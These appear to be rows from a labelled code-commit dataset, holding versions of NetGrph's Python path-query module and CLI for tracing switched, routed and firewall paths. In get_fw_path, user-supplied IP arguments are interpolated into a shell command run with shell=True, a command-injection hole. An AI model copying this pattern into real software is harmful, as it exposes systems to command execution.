import nglib
import nglib.query.nNode
import nglib.netdb.ip

logger = logging.getLogger(__name__)


def get_full_path(src, dst, rtype=""NGTREE"", onepath=True):
    """""" Gets the full path (switch->rt->VRF->rt->switch)

        Required NetDB for switchpath
    """"""

    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        logger.info(""Query: Finding Full Path (%s --> %s) for %s"",
                    src, dst, nglib.user)

        net1, net2 = src, dst
        n1tree, n2tree = None, None

        # Translate IPs to CIDRs
        if re.search(r'^\d+\.\d+\.\d+\.\d+$', net1):
            n1tree = nglib.query.net.get_net(net1, rtype=""NGTREE"")
            if n1tree:
                net1 = n1tree['_child001']['Name']

        if re.search(r'^\d+\.\d+\.\d+\.\d+$', net2):
            n2tree = nglib.query.net.get_net(net2, rtype=""NGTREE"")
            if n2tree:
                net2 = n2tree['_child001']['Name']

        srctree, dsttree, srcswp, dstswp = None, None, None, None

        if nglib.use_netdb:
            srctree = nglib.netdb.ip.get_netdb_ip(src)
            dsttree = nglib.netdb.ip.get_netdb_ip(dst)
        
        # Find Switched Path from Source to Router
        if srctree:
            router = n1tree['_child001']['Router']
            if 'StandbyRouter' in n1tree['_child001']:
                router = router + '|' + n1tree['_child001']['StandbyRouter']
            srcswp = get_switched_path(srctree['Switch'], router, verbose=False, onepath=onepath)
        
        # Find Switched Path from Router to Destination
        if dsttree:
            router = n2tree['_child001']['Router']
            if 'StandbyRouter' in n2tree['_child001']:
                router = router + '|' + n2tree['_child001']['StandbyRouter']
            dstswp = get_switched_path(router, dsttree['Switch'], verbose=False, onepath=onepath)

        # Same switch/vlan check
        switching = True
        if srctree and dsttree:
            if srctree['Switch'] == dsttree['Switch'] and \
                srctree['VLAN'] == dsttree['VLAN']:
                switching = False

        ## Create Parent Data Structure
        ngtree = nglib.ngtree.get_ngtree(""L2-L4"", tree_type=""PATHs"")

        # Populate Overall Paths
        if n1tree['_child001']['Name'] != n2tree['_child001']['Name']:
            ngtree[""L3 Path""] = net1 + "" -> "" + net2
            ngtree[""Lx Path""] = src + "" -> "" + dst
        if srctree and dsttree:
            ngtree[""L2 Path""] = srctree['Switch'] + "" ("" + srctree['SwitchPort'] \
            + "") -> "" + dsttree['Switch'] + "" ("" + dsttree['SwitchPort'] + "")""
        if onepath:
            ngtree[""Traversal Type""] = 'Single Path'
        else:
            ngtree[""Traversal Type""] = 'All Paths'

        # Add the SRC Data
        n1tree['_type'] = ""SRC""
        n1tree['Name'] = src
        nglib.ngtree.add_child_ngtree(ngtree, n1tree)

        if not switching and '_child002' in n2tree:
            nglib.ngtree.add_child_ngtree(n1tree, n2tree['_child002'])
            n1tree['_type'] = ""L2PATH""
            n1tree['Name'] = src + ' -> ' + dst

        # If there's src switched data add it
        if switching and srcswp:
            #srcswp['Name'] = ""SRC Switched Path""
            nglib.ngtree.add_child_ngtree(ngtree, srcswp)

        ## Check for routed paths (inter/intra VRF)
        rtree = get_full_routed_path(src, dst, rtype=""NGTREE"", l2path=True, onepath=onepath)
        if rtree and 'PATH' in rtree['_type']:
            if rtree['_type'] == 'L4-PATH':
                ngtree['L4 Path'] = rtree['Name']
            else:
                ngtree['L4 Path'] = 'VRF:' + n1tree['_child001']['VRF']
            nglib.ngtree.add_child_ngtree(ngtree, rtree)

        # Destination Switch Data
        if switching and dstswp:
            #dstswp['Name'] = ""DST Switched Path""
            nglib.ngtree.add_child_ngtree(ngtree, dstswp)

        # Add the DST Data
        if switching:
            n2tree['_type'] = ""DST""
            n2tree['Name'] = dst
            nglib.ngtree.add_child_ngtree(ngtree, n2tree)

        # Export NGTree
        ngtree = nglib.query.exp_ngtree(ngtree, rtype)
        return ngtree

def get_full_routed_path(src, dst, rtype=""NGTREE"", l2path=False, onepath=True):
    """""" Gets the full L3 Path between src -> dst IPs including inter-vrf routing
    """"""

    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        srct, dstt, ngtree = None, None, None

        # Translate IPs to CIDRs
        if re.search(r'^\d+\.\d+\.\d+\.\d+$', src):
            srct = nglib.query.net.get_net(src, rtype=""NGTREE"")

        if re.search(r'^\d+\.\d+\.\d+\.\d+$', dst):
            dstt = nglib.query.net.get_net(dst, rtype=""NGTREE"")
        
        # Intra VRF
        if srct['_child001']['VRF'] == dstt['_child001']['VRF']:
            ngtree = get_routed_path(src, dst, verbose=False, onepath=onepath)                 
        
        # Inter VRF
        else:
            secpath = get_fw_path(src, dst, rtype=""NGTREE"")
            ngtree = nglib.ngtree.get_ngtree(secpath['Name'], tree_type=""L4-PATH"")

            # Filter security path for relavent nodes
            first = True
            last = None
            for key in sorted(secpath.keys()):
                if '_child' in key:
                    if re.search(r'(Network|FW)', secpath[key]['Name']):

                        # First Entry gets a route check
                        if first:
                            rtree = get_routed_path(src, secpath[key]['gateway'], \
                                vrf=srct['_child001']['VRF'], l2path=l2path, onepath=onepath)
                            if rtree:
                                nglib.ngtree.add_child_ngtree(ngtree, rtree)
                            first = False
                        nglib.ngtree.add_child_ngtree(ngtree, secpath[key])
                        last = key

            # Last entry gets a route check
            if last:
                rtree = get_routed_path(secpath[last]['gateway'], dst, \
                    vrf=dstt['_child001']['VRF'], l2path=l2path, onepath=onepath)
                if rtree:
                    nglib.ngtree.add_child_ngtree(ngtree, rtree)
        
        return ngtree


def get_routed_path(net1, net2, rtype=""NGTREE"", vrf=""default"", verbose=True, l2path=True, onepath=True):
    """"""
    Find the routed path between two CIDRs and return all interfaces and
    devices between the two. This query need optimization.

    - net1 and net2 can be IPs, and it will find the CIDR
    - Uses Neo4j All Shortest Paths on ROUTED Relationships
    - Returns all distinct links along shortest paths along with distance

    """"""

    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        logger.info(""Query: Finding Routed Paths (%s --> %s) for %s"",
                    net1, net2, nglib.user)

        hopSet = set()

        # Translate IPs to CIDRs
        if re.search(r'^\d+\.\d+\.\d+\.\d+$', net1):
            n1tree = nglib.query.net.get_net(net1, rtype=""NGTREE"")
            net1 = n1tree['_child001']['Name']

        if re.search(r'^\d+\.\d+\.\d+\.\d+$', net2):
            n2tree = nglib.query.net.get_net(net2, rtype=""NGTREE"")
            if n2tree:
                net2 = n2tree['_child001']['Name']
        
        ngtree = nglib.ngtree.get_ngtree(""Path"", tree_type=""L3-PATH"")
        ngtree[""Path""] = net1 + "" -> "" + net2
        ngtree['Name'] = ngtree['Path']

        pathList = []
        pathRec = []

        # Finds all paths, then finds the relationships
        rtrp = nglib.py2neo_ses.cypher.execute(
            'MATCH (sn:Network), (dn:Network), rp = allShortestPaths '
            + '((sn)-[:ROUTED|ROUTED_BY|ROUTED_STANDBY*0..12]-(dn)) '
            + 'WHERE ALL(v IN rels(rp) WHERE v.vrf = {vrf}) '
            + 'AND sn.cidr =~ {net1} AND dn.cidr =~ {net2}'
            + 'UNWIND nodes(rp) as r1 UNWIND nodes(rp) as r2 '
            + 'MATCH (r1)<-[l1:ROUTED]-(n:Network {vrf:{vrf}})-[l2:ROUTED]->(r2) '
            + 'OPTIONAL MATCH (n)-[:L3toL2]->(v:VLAN) '
            + 'RETURN DISTINCT r1.name AS r1name, l1.gateway AS r1ip, '
            + 'r2.name AS r2name, l2.gateway as r2ip, v.vid AS vid, '
            + 'LENGTH(shortestPath((sn)<-[:ROUTED|ROUTED_BY|ROUTED_STANDBY*0..12]->(r1))) '
            + 'AS distance ORDER BY distance',
            {""net1"": net1, ""net2"": net2, ""vrf"": vrf})


        allpaths = dict()
        # Load all paths into tuples with distance value
        for rec in rtrp:
            p = (rec[""r1name""], rec[""r2name""])
            allpaths[p] = rec[""distance""]


        # Find tuple with shortest distance (r1, core1) vs (core1, r1)
        # Save to pathRec for second pass of records to populate tree
        for en in allpaths:
            if allpaths[en] < allpaths[tuple(reversed(en))]:
                (r1, r2) = en
                distance = allpaths[en]
                pathRec.append((r1, r2, distance))

        # Sort path records by distance, src router, dst router
        pathRec = sorted(pathRec, key=lambda tup: (tup[2], tup[0], tup[1]))

        # Build Trees and pathList from pathRecs
        for path in pathRec:
            for rec in rtrp:
                if path[0] == rec['r1name'] and path[1] == rec['r2name']:
                    #print(path[0], rec['r1ip'], '-->', path[1], rec['r2ip'])
                    rtree = nglib.ngtree.get_ngtree(""Hop"", tree_type=""L3-HOP"")
                    rtree['From Router'] = rec['r1name']
                    rtree['From IP'] = rec['r1ip']
                    rtree['To Router'] = rec['r2name']
                    rtree['To IP'] = rec['r2ip']
                    rtree['VLAN'] = rec['vid']

                    # Calculate hop distance
                    # Distance of 1 is correct, other distances should be:
                    #   ((dist - 1) / 2) + 1
                    distance = rec['distance']
                    if distance != 1:
                        distance = int((distance - 1) / 2) + 1

                    # Save distance
                    rtree['distance'] = distance

                    # Rename rtree
                    rtree['Name'] = ""#{:} {:}({:}) -> {:}({:})"".format( \
                    distance, rec['r1name'], rec['r1ip'], rec['r2name'], rec['r2ip'])

                    # Add Switchpath if requested
                    if l2path:
                        spath = get_switched_path(rec['r1name'], rec['r2name'], verbose=False)
                        for sp in spath:
                            if '_child' in sp and '_rvlans' in spath[sp]:
                                vrgx = r'[^0-9]*' + rec['vid'] + '[^0-9]*'
                                if re.search(vrgx, spath[sp]['_rvlans']):
                                    nglib.ngtree.add_child_ngtree(rtree, spath[sp])
                                # else:
                                #     print(spath[sp]['_rvlans'])
                                # nglib.ngtree.add_child_ngtree(rtree, spath[sp])

                    if not onepath or distance not in hopSet:
                        hopSet.add(distance)
                        nglib.ngtree.add_child_ngtree(ngtree, rtree)
                    pathList.append(rtree)

        # Check Results
        if pathList:

            ngtree['Hops'] = len(pathList)
            ngtree['Max Hops'] = max([s['distance'] for s in pathList])
            ngtree['VRF'] = vrf

            if onepath:
                ngtree['Traversal Type'] = 'Single Path'
            else:
                ngtree['Traversal Type'] = 'All Paths'

            # CSV Prints locally for now
            if rtype == ""CSV"":
                nglib.query.print_dict_csv(pathList)

            # Export NG Trees
            else:
                # Export NGTree
                ngtree = nglib.query.exp_ngtree(ngtree, rtype)
                return ngtree
        elif verbose:
            print(""No results found for path between {:} and {:}"".format(net1, net2), file=sys.stderr)


def get_switched_path(switch1, switch2, rtype=""NGTREE"", verbose=True, onepath=True):
    """"""
    Find the path between two switches and return all interfaces and
    devices between the two.

    - Uses Neo4j All Shortest Paths on NEI Relationships
    - Returns all distinct links along shortest paths along with distance

    Notes: Query finds all shortest paths between two Switch nodes. Then finds
    all links between individual nodes and gets both switch and port names. Data
    is sorted by distance then switch name.
    """"""

    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        logger.info(""Query: Finding Switched Paths (%s --> %s) for %s"",
                    switch1, switch2, nglib.user)

        pathList = []
        hopSet = set()
        ngtree = nglib.ngtree.get_ngtree(""Switched Paths"", tree_type=""L2-PATH"")
        ngtree[""Name""] = switch1 + "" -> "" + switch2

        swp = nglib.py2neo_ses.cypher.execute(
            'MATCH (ss:Switch), (ds:Switch), '
            + 'sp = allShortestPaths((ss)-[:NEI*0..9]-(ds)) '
            + 'WHERE ss.name =~ {switch1} AND ds.name =~ {switch2}'
            + 'UNWIND nodes(sp) as s1 UNWIND nodes(sp) as s2 '
            + 'MATCH (s1)<-[nei:NEI]-(s2), plen = shortestPath((ss)-[:NEI*0..9]-(s1)) '
            + 'RETURN DISTINCT s1.name AS csw, s2.name AS psw, '
            + 'nei.pPort AS pport, nei.cPort as cport, nei.native AS native, '
            + 'nei.cPc as cPc, nei.pPc AS pPc, nei.vlans AS vlans, nei.rvlans as rvlans, '
            + 'nei._rvlans AS p_rvlans, '
            + 'LENGTH(plen) as distance ORDER BY distance, s1.name, s2.name',
            {""switch1"": switch1, ""switch2"": switch2})

        # Process records
        last = 0
        for rec in swp:
            swptree = nglib.ngtree.get_ngtree(""Link"", tree_type=""L2-HOP"")

            # Fix distance from directed graph and add From -> To
            if rec.distance == 0:
                swptree['distance'] = rec.distance + 1
                swptree['_reverse'] = 1
                last = 1
            elif last:
                if rec.distance == last:
                    last += 1
                    swptree['distance'] = rec.distance + 1
                    swptree['_reverse'] = 1
                elif rec.distance == (last-1):
                    swptree['distance'] = rec.distance + 1
                    swptree['_reverse'] = 1
                else:
                    swptree['distance'] = rec.distance
                    swptree['_reverse'] = 0
                    last = 0
            else:
                swptree['distance'] = rec.distance
                swptree['_reverse'] = 0

            swptree['Child Switch'] = rec.csw
            swptree['Child Port'] = rec.cport
            swptree['Parent Switch'] = rec.psw
            swptree['Parent Port'] = rec.pport

            if rec.cPc:
                swptree['Child Channel'] = rec.cPc
                swptree['Parent Channel'] = rec.pPc
            if rec.rvlans:
                swptree['Link VLANs'] = rec.vlans
                swptree['Link rVLANs'] = rec.rvlans
                swptree['_rvlans'] = rec.p_rvlans
                swptree['Native VLAN'] = rec.native

            # Add directions to traversal
            if 'Parent Switch' in swptree:
                swptree = spath_direction(swptree)

            # Save data structures
            if not onepath or swptree['distance'] not in hopSet:
                hopSet.add(swptree['distance'])
                nglib.ngtree.add_child_ngtree(ngtree, swptree)
            
            # App Paths go in pathlist
            pathList.append(swptree)

        if pathList:

            if onepath:
                ngtree['Traversal Type'] = 'Single Path'
            else:
                ngtree['Traversal Type'] = 'All Paths'

            ngtree['Links'] = len(pathList)
            ngtree['Distance'] = max([s['distance'] for s in pathList])

            # CSV Prints locally for now
            if rtype == ""CSV"":
                nglib.query.print_dict_csv(pathList)

            # Export NG Trees
            else:
                # Export NGTree
                ngtree = nglib.query.exp_ngtree(ngtree, rtype)
                return ngtree
        elif verbose:
            print(""No results found for path between {:} and {:}"".format(switch1, switch2))

    return


def spath_direction(swp):
    """""" Adds directionality to spath queries 
        All spath queries traverse the directed paths from the core out
        Examine _reverse value for reversal of From -> To
    """"""

    nswp = dict()
    reverse = swp['_reverse']

    for en in swp:
        if 'Child' in en:
            if reverse:
                nen = en.replace('Child', 'From')
                nswp[nen] = swp[en]
            else:
                nen = en.replace('Child', 'To')
                nswp[nen] = swp[en]
        elif 'Parent' in en:
            if reverse:
                nen = en.replace('Parent', 'To')
                nswp[nen] = swp[en]
            else:
                nen = en.replace('Parent', 'From')
                nswp[nen] = swp[en]   
        else:
            nswp[en] = swp[en]    

    # Update Name
    nswp['Name'] = '#' + str(swp['distance']) + ' ' + \
    nswp['From Switch'] + '(' + nswp['From Port'] +  ') -> ' \
    + nswp['To Switch'] + '(' + nswp['To Port'] + ')'

    return nswp


def get_fw_path(src, dst, rtype=""TEXT"", verbose=True):
    """"""Discover the Firewall Path between two IP addresses""""""

    rtypes = ('TEXT', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        logcmd = nglib.config['nglib']['logcmd']
        logurl = nglib.config['nglib']['logurl']

        srcnet = nglib.query.net.find_cidr(src)
        dstnet = nglib.query.net.find_cidr(dst)

        logger.info(""Query: Security Path %s -> %s for %s"", src, dst, nglib.user)

        if nglib.verbose:
            print(""\nFinding security path from {:} -> {:}:\n"".format(srcnet, dstnet))

        # Shortest path between VRFs
        path = nglib.py2neo_ses.cypher.execute(
            'MATCH (s:Network { cidr:{src} })-[e1:VRF_IN]->(sv:VRF), '
            + '(d:Network {cidr:{dst}})-[e2:VRF_IN]->(dv:VRF), '
            + 'p = shortestPath((sv)-[:VRF_IN|ROUTED_FW|:SWITCHED_FW*0..20]-(dv)) RETURN s,d,p',
            src=srcnet, dst=dstnet)

        fwsearch = dict()

        ngtree = nglib.ngtree.get_ngtree(""Security Path"", tree_type=""L4-PATH"")

        # Go through all nodes in the path
        if len(path) > 0:
            for r in path.records:
                sn = r.s
                snp = nglib.query.nNode.getJSONProperties(sn)
                dn = r.d
                dnp = nglib.query.nNode.getJSONProperties(dn)

                startpath = snp['cidr'] + "" -> ""
                path = """"

                # Path
                nodes = r.p.nodes
                for node in nodes:
                    nProp = nglib.query.nNode.getJSONProperties(node)
                    label = nglib.query.nNode.getLabel(node)
                    tlabel = re.search(r'(\w+)', label)
                    hop = nglib.ngtree.get_ngtree(tlabel.group(1), tree_type=""L4-HOP"")
                    if re.search('VRF', label):
                        path = path + ""VRF:"" + nProp['name'] + "" -> ""

                    if re.search('FW', label):
                        path = path + nProp['name'] + "" -> ""
                        fwsearch[nProp['name']] = nProp['hostname'] + "","" + nProp['logIndex']
                        hop['Name'] = ""FW""
                                        
                    for prop in nProp:
                        hop[prop] = nProp[prop]
                    nglib.ngtree.add_child_ngtree(ngtree, hop)

                # Save the Path
                ngtree['Name'] = re.search(r'(.*)\s->\s$', path).group(1)
                path = snp['cidr'] + "" -> "" + path + dnp['cidr']

                # Text output for standalone query
                if rtype == ""TEXT"":
                    print(""\nSecurity Path: "" + path)

                    for fw in fwsearch.keys():
                        (hostname, logIndex) = fwsearch[fw].split(',')

                        # Splunk Specific Log Search, may need site specific adjustment
                        cmd = ""{:} 'index={:} host::{:} {:} {:}'"".format(
                            logcmd, logIndex, hostname, src, dst)
                        query = 'index={:} host::{:} {:} {:}'.format(
                            logIndex, hostname, src, dst)

                        query = query.replace("" "", ""%20"")

                        print(""\n{:} (15min): {:}{:}"".format(fw, logurl, query))

                        if verbose:
                            print(cmd)

                        proc = subprocess.Popen(
                            [cmd + "" 2> /dev/null""],
                            stdout=subprocess.PIPE,
                            shell=True,
                            universal_newlines=True)

                        (out, err) = proc.communicate()

                        if err:
                            print(err)
                        elif out:
                            print(out)

                # Space out
                print()

            # Export NGTree
            ngtree = nglib.query.exp_ngtree(ngtree, rtype)
            return ngtree

/n/n/n",0
187,ad1a94ea8e264996a2f29f6041c40f2874d7b949,"/netgrph.py/n/n#!/usr/bin/env python3
#
# NetGrph Database CLI Query Tool
#
# Copyright (c) 2016 ""Jonathan Yantis""
#
# This file is a part of NetGrph.
#
#    This program is free software: you can redistribute it and/or  modify
#    it under the terms of the GNU Affero General Public License, version 3,
#    as published by the Free Software Foundation.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    As a special exception, the copyright holders give permission to link the
#    code of portions of this program with the OpenSSL library under certain
#    conditions as described in each individual source file and distribute
#    linked combinations including the program with the OpenSSL library. You
#    must comply with the GNU Affero General Public License in all respects
#    for all of the code used other than as permitted herein. If you modify
#    file(s) with this exception, you may extend this exception to your
#    version of the file(s), but you are not obligated to do so. If you do not
#    wish to do so, delete this exception statement from your version. If you
#    delete this exception statement from all source files in the program,
#    then also delete it in the license file.
#
#
""""""netgrph is the primary CLI query too for NetGrph
   Also see ngreport
""""""
import os
import re
import argparse
import nglib
import nglib.query


# Default Config File Location
config_file = '/etc/netgrph.ini'
alt_config = './docs/netgrph.ini'

# Test/Dev Config
dirname = os.path.dirname(os.path.realpath(__file__))
if re.search(r'\/dev$', dirname):
    config_file = 'netgrphdev.ini'
elif re.search(r'\/test$', dirname):
    config_file = ""netgrphdev.ini""

parser = argparse.ArgumentParser()

parser = argparse.ArgumentParser(prog='netgrph',
                                 description='Query the NetGrph Database',
                                 epilog=""""""
                                 Examples:
                                 netgrph 10.1.1.1 (Free Search for IP),
                                 netgrph -net 10.1.1.0/24 (Search for CIDR),
                                 netgrph -group MDC (VLAN Database Search),
                                 netgrph -fp 10.1.1.1 10.2.2.1 (Firewall Path Search)
                                 """""")

parser.add_argument(""search"", help=""Search the NetGrph Database (Wildcard Default)"",
                    type=str)
parser.add_argument(""-ip"", help=""Network Details for an IP"",
                    action=""store_true"")
parser.add_argument(""-net"", help=""All networks within a CIDR (eg. 10.0.0.0/8)"",
                    action=""store_true"")
parser.add_argument(""-nlist"", help=""Get all networks in an alert group"",
                    action=""store_true"")
parser.add_argument(""-nfilter"", help=""Get all networks on a filter (see netgrph.ini)"",
                    action=""store_true"")
parser.add_argument(""-dev"", help=""Get the Details for a Device (Switch/Router/FW)"",
                    action=""store_true"")
parser.add_argument(""-path"", metavar=""src"",
                    help=""Full Path Between -p src dst (ip/cidr, requires NetDB)"",
                    type=str)
parser.add_argument(""-fpath"", metavar=""src"",
                    help=""Security Path between -fp src dst"",
                    type=str)
parser.add_argument(""-rpath"", metavar=""src"",
                    help=""Routed Path between -rp IP/CIDR1 IP/CIDR2 "",
                    type=str)
parser.add_argument(""-spath"", metavar=""src"",
                    help=""Switched Path between -sp sw1 sw2 (Neo4j Regex)"",
                    type=str)
parser.add_argument(""-group"", help=""Get VLANs for a Management Group"",
                    action=""store_true"")
parser.add_argument(""-vrange"", metavar='1[-4096]', help=""VLAN Range (default 1-1999)"",
                    type=str)
parser.add_argument(""-vid"", help=""VLAN ID Search"", action=""store_true"")
parser.add_argument(""-vtree"", help=""Get the VLAN Tree for a VNAME"",
                    action=""store_true"")
parser.add_argument(""-output"", metavar='TREE',
                    help=""Return Format: TREE, TABLE, CSV, JSON, YAML"", type=str)
parser.add_argument(""--days"", metavar='int', help=""Days in Past (NetDB Specific)"", type=int)
parser.add_argument(""--conf"", metavar='file', help=""Alternate Config File"", type=str)
parser.add_argument(""--debug"", help=""Set debugging level"", type=int)
parser.add_argument(""--verbose"", help=""Verbose Output"", action=""store_true"")

args = parser.parse_args()

# Alternate Config File
if args.conf:
    config_file = args.conf

# Test configuration exists
if not os.path.exists(config_file):
    if not os.path.exists(alt_config):
        raise Exception(""Configuration File not found"", config_file)
    else:
        config_file = alt_config

verbose = 0
if args.verbose:
    verbose = 1
if args.debug:
    verbose = args.debug

# 7 day default for NetDB
if not args.days:
    args.days = 7

# Default VLAN Range
if not args.vrange:
    args.vrange = ""1-1999""
if args.output:
    args.output = args.output.upper()

# Setup Globals for Debugging
nglib.verbose = verbose

# Initialize Library
nglib.init_nglib(config_file)

if args.fpath:
    nglib.query.path.get_fw_path(args.fpath, args.search)

elif args.spath:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.path.get_switched_path(args.spath, args.search, rtype=rtype)

elif args.rpath:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.path.get_routed_path(args.rpath, args.search, rtype=rtype)
elif args.path:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.path.get_full_path(args.path, args.search, rtype=rtype)

elif args.dev:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.dev.get_device(args.search, rtype=rtype, vrange=args.vrange)

elif args.ip:
    rtype = ""TREE""
    if args.output:
        rtype = args.output

    nglib.query.net.get_net(args.search, rtype=rtype, days=args.days)

elif args.net:
    rtype = ""CSV""
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_cidr(args.search, rtype=rtype)

elif args.nlist:
    rtype = ""CSV""
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_filter(args.search, rtype=rtype)

elif args.nfilter:
    rtype = ""CSV""
    if args.output:
        rtype = args.output
    nglib.query.net.get_networks_on_filter(nFilter=args.search, rtype=rtype)

elif args.group:
    nglib.query.vlan.get_vlans_on_group(args.search, args.vrange)

elif args.vtree:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.vlan.get_vtree(args.search, rtype=rtype)

elif args.vid:
    rtype = ""TREE""
    if args.output:
        rtype = args.output
    nglib.query.vlan.search_vlan_id(args.search, rtype=rtype)

# Universal Search
elif args.search:

    # Try VLAN ID First
    # try:
    #     #vid = int(args.search)
    #
    #     if vid >= 0 and vid <= 4096:
    #         rtype = ""TREE""
    #         if args.output: rtype = args.output
    #         nglib.query.searchVLANID(args.search,rtype=rtype)
    # except:
    vid = re.search(r'^(\d+)$', args.search)
    vname = re.search(r'^(\w+\-\d+)$', args.search)
    ip = re.search(r'^(\d+\.\d+\.\d+\.\d+)$', args.search)
    net = re.search(r'^(\d+\.\d+\.\d+\.\d+\/\d+)$', args.search)
    text = re.search(r'^(\w+)$', args.search)

    if vid:
        try:
            if int(args.search) >= 0 and int(args.search) <= 4096:
                rtype = ""TREE""
                if args.output:
                    rtype = args.output
                nglib.query.vlan.search_vlan_id(args.search, rtype=rtype)
        except:
            pass
    elif vname:
        rtype = ""TREE""
        if args.output:
            rtype = args.output
        nglib.query.vlan.get_vtree(args.search, rtype=rtype)
    elif net:
        rtype = ""CSV""
        if args.output:
            rtype = args.output
        nglib.query.net.get_networks_on_cidr(args.search, rtype=rtype)
    elif ip:
        rtype = ""TREE""
        if args.output:
            rtype = args.output
        nglib.query.net.get_net(args.search, rtype=rtype, days=args.days)
    elif text:
        rtype = ""TREE""
        if args.output:
            rtype = args.output
        nglib.query.universal_text_search(args.search, args.vrange, rtype=rtype)
    else:
        print(""Unknown Search:"", args.search)

else:
    parser.print_help()
    print()
/n/n/n/nglib/query/path.py/n/n#!/usr/bin/env python
#
# Copyright (c) 2016 ""Jonathan Yantis""
#
# This file is a part of NetGrph.
#
#    This program is free software: you can redistribute it and/or  modify
#    it under the terms of the GNU Affero General Public License, version 3,
#    as published by the Free Software Foundation.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#    As a special exception, the copyright holders give permission to link the
#    code of portions of this program with the OpenSSL library under certain
#    conditions as described in each individual source file and distribute
#    linked combinations including the program with the OpenSSL library. You
#    must comply with the GNU Affero General Public License in all respects
#    for all of the code used other than as permitted herein. If you modify
#    file(s) with this exception, you may extend this exception to your
#    version of the file(s), but you are not obligated to do so. If you do not
#    wish to do so, delete this exception statement from your version. If you
#    delete this exception statement from all source files in the program,
#    then also delete it in the license file.
""""""
Network Path Algorithms Between Switches and Routers

""""""
import re
import sys
import logging
import subprocess
import nglib
import nglib.query.nNode
import nglib.netdb.ip

logger = logging.getLogger(__name__)


def get_full_path(src, dst, rtype=""NGTREE""):
    """""" Gets the full path (switch->rt->VRF->rt->switch)

        Required NetDB for switchpath
    """"""

    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        logger.info(""Query: Finding Full Path (%s --> %s) for %s"",
                    src, dst, nglib.user)

        net1, net2 = src, dst
        n1tree, n2tree = None, None

        # Translate IPs to CIDRs
        if re.search(r'^\d+\.\d+\.\d+\.\d+$', net1):
            n1tree = nglib.query.net.get_net(net1, rtype=""NGTREE"")
            if n1tree:
                net1 = n1tree['_child001']['Name']

        if re.search(r'^\d+\.\d+\.\d+\.\d+$', net2):
            n2tree = nglib.query.net.get_net(net2, rtype=""NGTREE"")
            if n2tree:
                net2 = n2tree['_child001']['Name']

        srctree, dsttree, srcswp, dstswp = None, None, None, None

        if nglib.use_netdb:
            srctree = nglib.netdb.ip.get_netdb_ip(src)
            dsttree = nglib.netdb.ip.get_netdb_ip(dst)
        
        # Find Switched Path from Source to Router
        if srctree:
            router = n1tree['_child001']['Router']
            if 'StandbyRouter' in n1tree['_child001']:
                router = router + '|' + n1tree['_child001']['StandbyRouter']
            srcswp = get_switched_path(srctree['Switch'], router, verbose=False)
        
        # Find Switched Path from Router to Destination
        if dsttree:
            router = n2tree['_child001']['Router']
            if 'StandbyRouter' in n2tree['_child001']:
                router = router + '|' + n2tree['_child001']['StandbyRouter']
            dstswp = get_switched_path(router, dsttree['Switch'], verbose=False)

        # Same switch/vlan check
        switching = True
        if srctree and dsttree:
            if srctree['Switch'] == dsttree['Switch'] and \
                srctree['VLAN'] == dsttree['VLAN']:
                switching = False

        ## Create Parent Data Structure
        ngtree = nglib.ngtree.get_ngtree(""L2-L4"", tree_type=""PATHs"")

        # Populate Overall Paths
        if n1tree['_child001']['Name'] != n2tree['_child001']['Name']:
            ngtree[""L3 Path""] = net1 + "" -> "" + net2
            ngtree[""Lx Path""] = src + "" -> "" + dst
        if srctree and dsttree:
            ngtree[""L2 Path""] = srctree['Switch'] + "" ("" + srctree['SwitchPort'] \
            + "") -> "" + dsttree['Switch'] + "" ("" + dsttree['SwitchPort'] + "")""


        # Add the SRC Data
        n1tree['_type'] = ""SRC""
        n1tree['Name'] = src
        nglib.ngtree.add_child_ngtree(ngtree, n1tree)

        if not switching and '_child002' in n2tree:
            nglib.ngtree.add_child_ngtree(n1tree, n2tree['_child002'])
            n1tree['_type'] = ""L2PATH""
            n1tree['Name'] = src + ' -> ' + dst

        # If there's src switched data add it
        if switching and srcswp:
            #srcswp['Name'] = ""SRC Switched Path""
            nglib.ngtree.add_child_ngtree(ngtree, srcswp)

        ## Check for routed paths (inter/intra VRF)
        rtree = get_full_routed_path(src, dst, rtype=""NGTREE"", l2path=True)
        if rtree and 'PATH' in rtree['_type']:
            if rtree['_type'] == 'L4-PATH':
                ngtree['L4 Path'] = rtree['Name']
            else:
                ngtree['L4 Path'] = 'VRF:' + n1tree['_child001']['VRF']
            nglib.ngtree.add_child_ngtree(ngtree, rtree)

        # Destination Switch Data
        if switching and dstswp:
            #dstswp['Name'] = ""DST Switched Path""
            nglib.ngtree.add_child_ngtree(ngtree, dstswp)

        # Add the DST Data
        if switching:
            n2tree['_type'] = ""DST""
            n2tree['Name'] = dst
            nglib.ngtree.add_child_ngtree(ngtree, n2tree)

        # Export NGTree
        ngtree = nglib.query.exp_ngtree(ngtree, rtype)
        return ngtree

def get_full_routed_path(src, dst, rtype=""NGTREE"", l2path=False):
    """""" Gets the full L3 Path between src -> dst IPs including inter-vrf routing
    """"""

    rtypes = ('CSV', 'TREE', 'JSON', 'YAML', 'NGTREE')

    if rtype in rtypes:

        srct, dstt, ngtree = None, None, None

        # Translate IPs to CIDRs
